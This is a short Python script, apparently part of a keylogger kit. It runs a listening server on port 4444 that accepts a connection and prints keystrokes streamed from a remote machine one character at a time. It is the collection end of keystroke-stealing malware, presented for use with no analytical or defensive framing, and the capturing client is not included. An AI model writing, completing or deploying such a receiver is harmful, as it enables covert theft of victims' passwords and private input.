import socket


def start_keylog_server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host = '0.0.0.0'  # Listen on all available interfaces
    port = 4444

    try:
        server_socket.bind((host, port))
        server_socket.listen(1)
        print(f"Keylog server listening on {host}:{port}")
        client_socket, client_address = server_socket.accept()
        print(f"Connection from {client_address}")

        keylog_data = ""

        while True:
            try:
                char = client_socket.recv(1)
                if not char:
                    break
                char = char.decode('utf-8')
                print(char, end='', flush=True)
            except:
                print("--SK--") # If a special key was pressed

    except KeyboardInterrupt:
        print("\nServer shutting down...")
    except Exception as e:
        print(f"An error occurred: {e}")
    finally:
        if 'client_socket' in locals():
            client_socket.close()
        server_socket.close()


if __name__ == "__main__":
    start_keylog_server()